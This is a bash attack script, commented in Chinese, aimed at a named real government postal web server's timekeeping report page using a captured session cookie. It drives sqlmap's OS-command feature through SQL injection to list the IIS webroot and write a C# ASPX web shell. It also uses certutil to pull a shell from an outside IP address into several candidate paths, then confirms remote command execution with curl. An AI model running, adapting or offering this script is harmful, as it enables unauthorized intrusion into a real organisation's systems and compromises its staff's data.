#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
TARGET='http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng'

echo "🔥 找webroot并GetShell"

# 方法1: 通过IIS配置找webroot
echo ""
echo "[1] 查找webroot..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="dir C:\inetpub\wwwroot" -v 0 2>&1 | tee dir_webroot.txt
grep -A 20 "command standard output" dir_webroot.txt

# 方法2: 直接尝试写入根目录
echo ""
echo "[2] 尝试写入 C:\inetpub\wwwroot\"
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="echo ^<%@ Page Language=\"C#\" %^>^<% Response.Write(System.Diagnostics.Process.Start(\"cmd\",\"/c \"+Request[\"c\"]).StandardOutput.ReadToEnd()); %^> > C:\inetpub\wwwroot\s.aspx" -v 0 2>&1

sleep 2
curl -sk "http://vps.vnpost.vn/s.aspx?c=whoami" && echo "✅ GetShell: /s.aspx" && exit 0

# 方法3: 找应用程序池路径
echo ""
echo "[3] 查找应用程序池路径..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="dir C:\inetpub\wwwroot\*" -v 0 2>&1

# 方法4: 通过web.config位置反推
echo ""
echo "[4] 查找web.config..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="where /r C:\inetpub web.config" -v 0 2>&1 | head -50

# 方法5: 直接写到各个可能位置
echo ""
echo "[5] 批量尝试写入..."
for path in "C:\inetpub\wwwroot" "D:\inetpub\wwwroot" "C:\wwwroot" "D:\wwwroot"; do
    echo "  尝试: $path"
    python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="echo test > ${path}\test.txt" -v 0 2>&1
    python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd="certutil -urlcache -split -f http://82.29.71.156/s.aspx ${path}\x.aspx" -v 0 2>&1
    
    curl -sk "http://vps.vnpost.vn/x.aspx?c=whoami" && echo "✅ GetShell: /x.aspx" && exit 0
done

echo ""
echo "⚠️  继续查找..."
